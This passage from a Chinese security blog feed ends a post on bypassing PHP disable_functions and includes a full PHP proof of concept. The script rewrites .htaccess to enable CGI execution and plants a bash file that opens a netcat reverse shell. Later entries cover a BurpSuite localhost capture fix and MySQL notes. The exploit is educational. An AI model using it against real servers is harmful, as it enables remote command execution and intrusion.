.php这样的配置，这其实是指定了文件扩展名和内容类型之间的映射关系，而AddHandler则是指定扩展名和处理程序之间的关系，也就是说，可以指定某个特定的扩展名的文件，如何来进行处理。</p><p>有了Options和AddHandler，我们就可以随便指定一个特定的文件扩展名以特定的程序来处理，这样思路就很清晰了：先把要执行的程序写入一个特定扩展名的文件里，然后修改.htaccess文件，通过Options指令允许使用mod_cgi模块执行CGI脚本，然后再让我们特定的扩展名以cgi-script进行处理，这样我们甚至可以反弹一个shell出来。</p><p>POC如下，附注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"nc -c'/bin/bash' 127.0.0.1 4444"</span>; <span class="comment">//反弹一个shell出来，这里用本地的4444端口</span></span><br><span class="line">$shellfile =<span class="string">"#!/bin/bash\n"</span>; <span class="comment">//指定shell</span></span><br><span class="line">$shellfile .=<span class="string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span>; <span class="comment">//需要指定这个header，否则会返回500</span></span><br><span class="line">$shellfile .=<span class="string">"$cmd"</span>; </span><br><span class="line">functioncheckEnabled($text,$condition,$yes,$no) <span class="comment">//this surely can be shorter</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"$text: "</span> . ($condition ?$yes : $no) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'checked'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  @file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"\nSetEnv HTACCESS on"</span>, FILE_APPEND); </span><br><span class="line">  header(<span class="string">'Location: '</span> . $_SERVER[<span class="string">'PHP_SELF'</span>]. <span class="string">'?checked=true'</span>); <span class="comment">//执行环境的检查</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  $modcgi = in_array(<span class="string">'mod_cgi'</span>,apache_get_modules()); <span class="comment">// 检测mod_cgi是否开启</span></span><br><span class="line">  $writable = is_writable(<span class="string">'.'</span>); <span class="comment">//检测当前目录是否可写</span></span><br><span class="line">  $htaccess = !<span class="keyword">empty</span>($_SERVER[<span class="string">'HTACCESS'</span>]);<span class="comment">//检测是否启用了.htaccess</span></span><br><span class="line">    checkEnabled(<span class="string">"Mod-Cgienabled"</span>,$modcgi,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">    checkEnabled(<span class="string">"Iswritable"</span>,$writable,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">    checkEnabled(<span class="string">"htaccessworking"</span>,$htaccess,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">  <span class="keyword">if</span>(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error. All of the above mustbe true for the script to work!"</span>; <span class="comment">//必须满足所有条件</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line"> checkEnabled(<span class="string">"Backing </span></span><br><span class="line"><span class="string">up.htaccess"</span>,copy(<span class="string">".htaccess"</span>,<span class="string">".htaccess.bak"</span>),<span class="string">"Suceeded!Saved in </span></span><br><span class="line"><span class="string">.htaccess.bak"</span>,<span class="string">"Failed!"</span>); <span class="comment">//备份一下原有.htaccess</span></span><br><span class="line">checkEnabled(<span class="string">"Write </span></span><br><span class="line"><span class="string">.htaccessfile"</span>,file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"Options </span></span><br><span class="line"><span class="string">+ExecCGI\nAddHandlercgi-script </span></span><br><span class="line"><span class="string">.dizzle"</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//.dizzle，我们的特定扩展名</span></span><br><span class="line">    checkEnabled(<span class="string">"Write shellfile"</span>,file_put_contents(<span class="string">'shell.dizzle'</span>,$shellfile),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//写入文件</span></span><br><span class="line">    checkEnabled(<span class="string">"Chmod777"</span>,chmod(<span class="string">"shell.dizzle"</span>,<span class="number">0777</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//给权限</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Executing the script now.Check your listener &lt;img src = 'shell.dizzle' style ='display:none;'&gt;"</span>; <span class="comment">//调用</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在本地开nc监听4444端口，然后在浏览器中打开这个页面，如果执行成功，将会反弹一个shell到4444端口。</p><p><strong>五、其他方式</strong></p><p>除上述方式外，在某些特定情况下，还有很多能够绕过php.ini的禁用函数达到执行系统命令目的的方法，但是由于这些方法受到的限制颇多，很少有满足条件的真实环境，所以鉴于篇幅原因，以下只粗略介绍几个其他绕过方式，并提供相关的详细介绍的文章链接，如果有兴趣详细了解，可以参考互联网上的相关资料。</p><p><strong>ImageMagick</strong></p><p>ImageMagick是一款使用量很广的图片处理程序，很多厂商包括Discuz、Drupal、Wordpress等常用CMS中也调用了ImageMagick扩展或ImageMagick库进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。在ImageMagick6.9.3-9以前的所有版本中都存在一个漏洞，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入，官方在6.9.3-9版本中对漏洞进行了不完全的修复。关于这个漏洞的具体利用和防御方式可以参考：</p><p> <code>http://wooyun.jozxing.cc/static/drops/papers-15589.html</code>。</p><p><strong>pcntl_exec</strong></p><p>pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。</p><p>COM <strong>组件</strong></p><p>Windows环境下，当php.ini的设置项com.allow_dcom =true时，可以通过COM组件执行系统命令，甚至开启安全模式也可以，相关资料参考： <code>https://www.exploit-db.com/exploits/4553/</code>。</p><p><strong>win32std</strong></p><p>win32std是一个很老的PHP扩展，其中的win_shell_execute函数可以用来执行Windows系统命令：<code>https://www.exploit-db.com/exploits/4218/</code>。</p><p><strong>六、总结</strong></p><p>对于入侵者来说，拿到一个webshell之后，如果想要进一步获取更高的权限或更多的数据和信息，执行系统命令几乎是必须的。当我们在PHP应用中出现了某些纰漏导致遭到入侵时，如何让损失降到最低就成了首要的问题。从本文已经列举的方法中不难看出只要掌握了这些原理，防范工作是非常简单有效的，只要经常关注安全动态，是完全可以做到对以上绕过措施进行防御的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;笔记内容：PHP的危险函数，和 php.ini 里的 disable_functions 设置，以及整理了一些绕过 disable_functions 的思路。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>BurpSuite 无法抓取本地DVWA数据包的解决方案</title>
    <link href="https://pwn4justice.github.io/2019/06/29/BurpSuite-%E6%97%A0%E6%B3%95%E6%8A%93%E5%8F%96%E6%9C%AC%E5%9C%B0DVWA%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://pwn4justice.github.io/2019/06/29/BurpSuite-无法抓取本地DVWA数据包的解决方案/</id>
    <published>2019-06-29T15:26:00.000Z</published>
    <updated>2019-07-29T15:38:59.339Z</updated>
    
    <content type="html"><![CDATA[<p>在本地（localhost）使用phpStudy搭建了一个 DVWA 测试环境，但是某些场景需要得知 POST 表单中的数据，于是打开 BurpSuite，但是发现 BP 是无法拦截到本地的包的，那怎么办呢？</p><a id="more"></a><h3 id="问题提出"><a href="#问题提出" class="headerlink" title="问题提出"></a>问题提出</h3><p>BurpSuite 无法拦截目标为 127.0.0.1 的数据包。</p><p><strong>软件版本：</strong></p><ul><li>Chrome：75.0.3770.100</li><li>BurpSuite：1.7.37</li></ul><h3 id="网络解决方案（本文测试，全军覆没）"><a href="#网络解决方案（本文测试，全军覆没）" class="headerlink" title="网络解决方案（本文测试，全军覆没）"></a>网络解决方案（本文测试，全军覆没）</h3><ol><li><p>关闭 Chrome 的代理自动更改插件，并设置 LAN 里的代理地址，清除”高级”选项里的 <code>local</code> 值</p><p> 参考地址：<code>https://blog.csdn.net/FunkyPants/article/details/78143171</code></p></li><li><p>使用 Firefox 并设置手动配置代理，在不使用代理框里留空</p><p> 参考地址：<code>https://blog.51cto.com/antivirusjo/2059299</code></p></li></ol><h3 id="最终可行方案"><a href="#最终可行方案" class="headerlink" title="最终可行方案"></a>最终可行方案</h3><ol><li><p>修改 hosts 文件，增加一个域名解析，域名随意：</p><p> <img src="hosts.jpg" alt="hosts"></p></li><li><p>BurpSuite 照常配置，Chrome 照常配置（使用代理插件也可以）</p></li><li><p>使用域名 <code>shield.cn</code> 访问 DVWA，成功拦截，如图所示：</p><p> <img src="res.jpg" alt="result"></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在本地（localhost）使用phpStudy搭建了一个 DVWA 测试环境，但是某些场景需要得知 POST 表单中的数据，于是打开 BurpSuite，但是发现 BP 是无法拦截到本地的包的，那怎么办呢？&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL 总结二</title>
    <link href="https://pwn4justice.github.io/2019/06/27/MySQL-%E6%80%BB%E7%BB%93%E4%BA%8C/"/>
    <id>https://pwn4justice.github.io/2019/06/27/MySQL-总结二/</id>
    <published>2019-06-27T09:04:21.000Z</published>
    <updated>2019-07-30T09:05:05.355Z</updated>
    
    <content type="html"><![CDATA[<p>内容：</p><ul><li>视图</li><li>存储过程</li><li>游标</li></ul><a id="more"></a><h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><ul><li>CREATE VIEW viewname AS …<ul><li>CREATE OR REPLACE VIEW</li><li>DROP VIEW &amp;&amp; CREATE VIEW</li></ul></li><li>SHOW CREATE VIEW viewname</li><li>DROP VIEW</li><li>SELECT FROM VIEW</li><li>UNION VIEW</li><li>INSERT / UPDATE / DELTE - 但是有限制</li></ul><br><h3 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h3><ul><li>创建存储过程的权限</li><li>使用存储过程的权限</li><li>创建<ul><li>CREATE PROCEDURE name() BEGIN … END;</li><li>带 OUT 参数的存储过程创建与调用</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE productpricing(</span><br><span class="line">    OUT pl DECIMAL(8,2),</span><br><span class="line">    OUT ph DECIMAL(8,2),</span><br><span class="line">    OUT pa DECIMAL(8,2)</span><br><span class="line">)</span><br><span class="line">BEGIN</span><br><span class="line">SELECT Min(prod_price)</span><br><span class="line">INTO pl</span><br><span class="line">FROM products;</span><br><span class="line"></span><br><span class="line">SELECT Max(prod_price)</span><br><span class="line">INTO ph</span><br><span class="line">FROM products;</span><br><span class="line"></span><br><span class="line">SELECT Avg(prod_price)</span><br><span class="line">INTO pa</span><br><span class="line">FROM products;</span><br><span class="line"></span><br><span class="line">END;</span><br><span class="line"></span><br><span class="line">CALL productpricing(@minprice, @maxprice, @avgprice);</span><br><span class="line"></span><br><span class="line">SELECT @maxprice;</span><br><span class="line">+---------------+</span><br><span class="line">| @maxprice|</span><br><span class="line">+---------------+</span><br><span class="line">| 2003.332|</span><br><span class="line">+---------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------- 带 IN/OUT 的存储过程 ----------</span><br><span class="line">CREATE PROCEDURE ordertotal(</span><br><span class="line">    IN onumber INT,</span><br><span class="line">    OUT ototal DECIMAL(8,2)</span><br><span class="line">)</span><br><span class="line">BEGIN</span><br><span class="line">SELECT SUM(item_price * quantity)</span><br><span class="line">FROM orderitems</span><br><span class="line">WHERE order_num = onumber</span><br><span class="line">INTO ototal;;;注意此处 INTO 并没有直接跟在 SELECT 后</span><br><span class="line">END;</span><br><span class="line"></span><br><span class="line">CALL ordertotal(20005, @total);;;20005 是订单号</span><br><span class="line">SELECT @total;</span><br><span class="line">+--------+</span><br><span class="line">| @total |</span><br><span class="line">+--------+</span><br><span class="line">| 4000 |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure><ul><li>执行<ul><li>又称调用</li><li>CALL name(@arg1, @arg2…);</li><li>执行可以显示结果，也可以不显示</li></ul></li></ul><p><strong>注：</strong> 在命令行里<code>;</code> 是语句分隔符，如果命令行里要解释存储过程自身内的 <code>;</code> 字符，则应该先临时更改分隔符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DELIMETER //</span><br><span class="line">CREATE PROCEDURE productpricing()</span><br><span class="line">BEGIN</span><br><span class="line">SELECT Avg(prod_price) AS priceaverage</span><br><span class="line">FROM products;;;此处出现了 &apos;;&apos;</span><br><span class="line">END //</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure><ul><li>DROP PROCEDURE name;            没有()</li><li>SHOW RPOCEDURE STATUS;        获得谁创建了该存储过程，何时创建的等详细信息</li></ul><p><strong>一个更复杂的存储过程例子</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">-- Name: ordertotal;; &apos;-- &apos; 后接注释，这在MySQL注入里已经出现过多次了!!</span><br><span class="line">-- Parameters:  onumber = order_number</span><br><span class="line">-- taxable = 0 if not taxable, 1 if taxable</span><br><span class="line">-- ototal = order total variable</span><br><span class="line"></span><br><span class="line">CREATE PROCEDURE ordertotal(</span><br><span class="line">    IN onumber INT,</span><br><span class="line">    IN taxable BOOLEAN,</span><br><span class="line">    OUT ototal DECIMAL(8,2)</span><br><span class="line">) COMMENT &quot;Obtain order total, optionally adding tax&quot;</span><br><span class="line">BEGIN</span><br><span class="line">-- Declare variable for total</span><br><span class="line">DECLARE total DECIMAL(8,2);</span><br><span class="line"></span><br><span class="line">-- Declare tax percentage</span><br><span class="line">DECLARE taxrate INT DEFAULT 6;</span><br><span class="line"></span><br><span class="line">-- Get the order total</span><br><span class="line">SELECT SUM(item_price * quantity)</span><br><span class="line">FROM orderitems</span><br><span class="line">WHERE order_num = onumber</span><br><span class="line">INTO total;</span><br><span class="line"></span><br><span class="line">IF taxable THEN</span><br><span class="line">SELECT total+(total/100*taxrate) INTO total;</span><br><span class="line">END IF;-- 还有 ELSEIF 和 ELSE 等子句</span><br><span class="line"></span><br><span class="line">-- Finally, save to OUT variable</span><br><span class="line">SELECT total INTO ototal;</span><br><span class="line">END;</span><br><span class="line"></span><br><span class="line">-- 调用：-- </span><br><span class="line">CALL ordertotal(20004, 1, @total);</span><br><span class="line">SELECT @total;</span><br><span class="line"></span><br><span class="line">CALL ordertotal(20003, 0, @total);</span><br><span class="line">SELECT @total;</span><br></pre></td></tr></table></figure><br><h3 id="游标"><a href="#游标" class="headerlink" title="游标"></a>游标</h3><p><strong>注：</strong> MySQL的游标只能用于存储过程中，这点和其他 DBMS 有些不太相同</p><p>使用过程：</p><ol><li>定义（创建）<ol><li>DECLARE</li></ol></li><li>使用<ol><li>OPEN</li><li>CLOSE</li><li>REPEAT – 常用来对游标进行循环读取</li><li>LEAVE – 手动结束循环</li></ol></li><li>检索<ol><li>FETCH</li></ol></li><li>关闭 <ol><li>CLOSE</li></ol></li></ol><p>使用示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE processorders()</span><br><span class="line">BEGIN</span><br><span class="line">-- Declare the cursor</span><br><span class="line">DECLARE ordernumbers CURSOR-- 游标使用 DECLARE 定义，像变量一样</span><br><span class="line">FOR-- FOR 关键字</span><br><span class="line">SELECT order_num FROM orders;-- 游标检索的内容</span><br><span class="line"></span><br><span class="line">-- Open the cursor</span><br><span class="line">OPEN ordernumbers;-- OPEN 打开</span><br><span class="line"></span><br><span class="line">-- Fetch Data:</span><br><span class="line">FETCH ordernumbers INTO ...;-- 只会得到一个值，如需取得游标内所有值，应使用循环，REPEAT</span><br><span class="line"></span><br><span class="line">-- Close the cursor</span><br><span class="line">CLOSE ordernumbers;-- 不用时关闭，节省内存空间</span><br><span class="line"></span><br><span class="line">END;-- END 时也会自动关闭游标！</span><br><span class="line">-- 游标相当于指针--</span><br></pre></td></tr></table></figure><p>更接近真实的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE processorders()</span><br><span class="line">BEGIN</span><br><span class="line">DECLARE done BOOLEAN DEFAULT 0;</span><br><span class="line">DECLARE o INT;</span><br><span class="line">DECLARE t DECIMAL(8,2);</span><br><span class="line"></span><br><span class="line">DECLARE ordernumbers CURSOR</span><br><span class="line">FOR</span><br><span class="line">SELECT order_num FROM orders;</span><br><span class="line"></span><br><span class="line">-- Declare continue handler用来检测结束条件</span><br><span class="line">DECLARE CONTINUE HANDLER FOR SQLSTATE &apos;02000&apos; SET done=1;-- 02000 是行读取错误（读完了），然后设置 done 变量为1</span><br><span class="line"></span><br><span class="line">-- Create a new table</span><br><span class="line">CREATE TABLE IF NOT EXISTS ordertotals(</span><br><span class="line">        order_num INT,</span><br><span class="line">        total DECIMAL(8,2)</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    -- OPEN cursor</span><br><span class="line">    OPEN ordernumbers;</span><br><span class="line">    </span><br><span class="line">    REPEAT</span><br><span class="line">    -- 循环</span><br><span class="line">    FETCH ordernumbers INTO o;</span><br><span class="line">    </span><br><span class="line">    CALL ordertotal(o, 1, t);-- 调用上面计算税的存储过程</span><br><span class="line">    </span><br><span class="line">    -- Insert into new table</span><br><span class="line">    INSERT INTO ordertotals(order_num, total)</span><br><span class="line">    VALUES(o, t);</span><br><span class="line">    </span><br><span class="line">    -- END LOOP</span><br><span class="line">    UNTIL done END REPEAT;</span><br><span class="line">    </span><br><span class="line">    CLOSE ordernumbers;</span><br><span class="line">    </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;视图&lt;/li&gt;
&lt;li&gt;存储过程&lt;/li&gt;
&lt;li&gt;游标&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL 总结</title>
    <link href="https://pwn4justice.github.io/2019/06/25/MySQL-%E6%80%BB%E7%BB%93/"/>
    <id>https://pwn4justice.github.io/2019/06/25/MySQL-总结/</id>
    <published>2019-06-25T14:01:23.000Z</published>
    <updated>2019-07-26T15:57:40.234Z</updated>
    
    <content type="html"><![CDATA[<p>有关MySQL使用的总结</p><a id="more"></a><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ol><li><p>文本串函数</p><ol><li>concat()</li><li>concat_ws()</li><li>trim()</li><li>rtrim()</li><li>ltrim()</li><li>upper()</li><li>lower()</li><li>SubString() - 返回子串的字符<ul><li>SubString(s, n , len)          ===&gt; 从字符串 s 返回一个长度为 len 的子字符串，起始于 n（n从1开始算）</li><li>SubString(‘computer’, 3) ===&gt; mputer</li><li>SubString(‘computer’, 3, 4) ===&gt; mput</li><li>SubString(‘computer’, -3) ===&gt; ter</li><li>SubString(‘computer’, -5, 3) ===&gt; put</li></ul></li><li>hex() 与 unhex()<ol><li>HEX(): 将十进制转换为十六进制（以字符串形式返回）<ul><li>HEX(10) ===&gt; ‘A’ ===&gt; 10 的十六进制表示就是 A</li><li>HEX(30) ===&gt; ‘1E’ ===&gt; 16(十六进制的’1’) + 14(十六进制的’E’)</li><li>如果我想让 UNHEX 打印 ‘a’ ，可以先 HEX(97) ===&gt; ‘61’，再使用 UNHEX(‘61’)</li></ul></li><li>UNHEX(): 将十六进制转换为十进制的ASCII码值，在将对应的字符输出<ul><li>UNHEX(‘A’) ===&gt; 十进制的10 ===&gt; 对应的ASCII字符是：LF（该字符无法打印）</li><li>UNHEX(‘61’) ===&gt; ‘a’</li><li>UNHEX 是必须加单引号的！</li></ul></li><li>更多实例：<ul><li>UNHEX(‘4841505059’) ===&gt; HAPPY</li><li>UNHEX(‘4D7953514C’) ===&gt; MySQL</li></ul></li></ol></li><li>length()<ul><li>LENGTH(‘computer’) ===&gt; 8</li></ul></li><li>locate()  - 找出一个串的子串<ul><li>LOCATE( substr, str )<ul><li>返回 substr 在 str 中第一次出现的位置</li><li>LOCATE(‘abc’, ‘hahahabcabc’) ===&gt; 6</li><li>LOCATE(‘abc’, ‘xxxxxx’) ===&gt; 0</li></ul></li><li>LOCATE( substr, str, pos)<ul><li>返回子符串 substr 在字符串 str 从pos 处开始的第一次出现的位置。如果substr 不在str 中，则返回值为0 </li><li>LOCATE(‘abc’, ‘hahahabcabc’, 7) ===&gt; 9</li><li>LOCATE(‘abc’, ‘xxxxxx’, 9) ===&gt; 0</li><li>LOCATE(‘abc’, ‘xxxxxx’, 3) ===&gt; 0</li></ul></li></ul></li><li>left()<ul><li>LEFT( string , length) : 从字符串string左边开始截取length位<ul><li>SELECT LEFT(‘<a href="http://www.baidu\.com&#39;" target="_blank" rel="noopener">www.baidu\.com&#39;</a>, 9) ===&gt; ‘<a href="http://www.baidu&#39;" target="_blank" rel="noopener">www.baidu&#39;</a></li><li>SELECT LEFT(‘<a href="http://www.baidu\.com&#39;" target="_blank" rel="noopener">www.baidu\.com&#39;</a>, 3) ===&gt; ‘www’</li></ul></li></ul></li><li>right()<ul><li>同 LEFT()</li></ul></li><li>soundex()<ul><li>WHERE Soundex(‘L Yee’) == Soundex(‘L Yie’)</li></ul></li></ol></li><li><p>日期函数</p><ol><li>格式必须是这样的：’ 2019-07-22 ‘</li><li>Date()</li><li>Now()</li><li>Year()</li><li>Month()</li><li>Day()</li><li>CurDate()</li><li>CurTime()</li><li>Hour()</li><li>Second()</li><li>Minute()</li><li>Time() - 返回日期时间的时间部分</li><li>AddDate() - 增加一个日期</li><li>AddTime() - 增加一个时间</li><li>DateDiff() - 计算两个日期之差</li><li>Date_Format() - 返回格式化的日期或时间串</li><li>DayOfWeek() - 对于一个日期，返回星期几</li></ol></li><li><p>系统函数</p><ol><li>version()</li><li>user() / system_user() / session_user()</li><li>current_user() / current_user</li><li>database() / schema() - 当前数据库</li><li>connection_id()</li><li>charset(str)    获取str的字符集</li><li>collation(str)  获取str的字符排序方法</li><li>last_insert_id()</li></ol></li><li><p>数值函数</p><ol><li>Abs()</li><li>Sqrt()</li><li>Pi()</li><li>Exp()</li><li>Cos()</li><li>Sin()</li><li>Tan()</li><li>Mod()</li><li>Rand()<ul><li>生成0-1的浮点随机数</li><li>生成 [a,b]的随机数可以这样做：<ul><li>x=a</li><li>y=(b-a) + 1</li><li>SELECT floor(x + rand() * y)</li></ul></li></ul></li><li>floor()<ul><li>小于等于该值的最大整数<ul><li>floor(1.23) ===&gt; 1</li><li>floor(-1.34) ==&gt; -2</li></ul></li></ul></li><li>ceil(x)/ceiling(x)<ul><li>返回不小于x的最小整数</li></ul></li><li>truncate(x, d)<ul><li>返回数值 x 保留到小数点后 d 位的值，截断时不进行四舍五入</li></ul></li><li>round(x)/round(x,d)<ol><li>返回离x最近的整数，进行截断时四舍五入</li></ol></li></ol></li></ol><ol start="5"><li><p>聚集函数 [ 对某<strong>列</strong>操作 ]</p><ol><li>AVG()</li><li>COUNT()</li><li>MAX()</li><li>MIN()</li><li>SUM()</li><li><strong>DISTINCT</strong></li></ol></li><li><p>条件判断函数</p><ol><li><p>IF(expr, do1, do2)</p></li><li><p>IFNULL(v1, v2)      如果v1不空，则显示v1</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CASE </span><br><span class="line">WHEN expr1 THEN</span><br><span class="line">v1</span><br><span class="line">WHEN expr2 THEN</span><br><span class="line">v2</span><br><span class="line">...</span><br><span class="line">ELSE</span><br><span class="line">vn</span><br><span class="line">END CASE</span><br><span class="line">---------------------</span><br><span class="line">CASE expr</span><br><span class="line">WHEN v1 THEN do1</span><br><span class="line">WHEN v2 THEN do2</span><br><span class="line">...</span><br><span class="line">ELSE doN</span><br><span class="line">END CASE;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="分组数据"><a href="#分组数据" class="headerlink" title="分组数据"></a>分组数据</h3><p><em>分组数据一般会结合 聚集函数 使用，不然比较鸡肋。看：</em></p><p><strong>products 表：</strong></p><table><thead><tr><th>prod_id</th><th>vend_id</th><th>prod_name</th><th>prod_price</th></tr></thead><tbody><tr><td>ANV01</td><td>1001</td><td>.5 ton anvil</td><td>5.66</td></tr><tr><td>ANV02</td><td>1001</td><td>1 ton anvil</td><td>9.99</td></tr><tr><td>ANV03</td><td>1001</td><td>2 ton 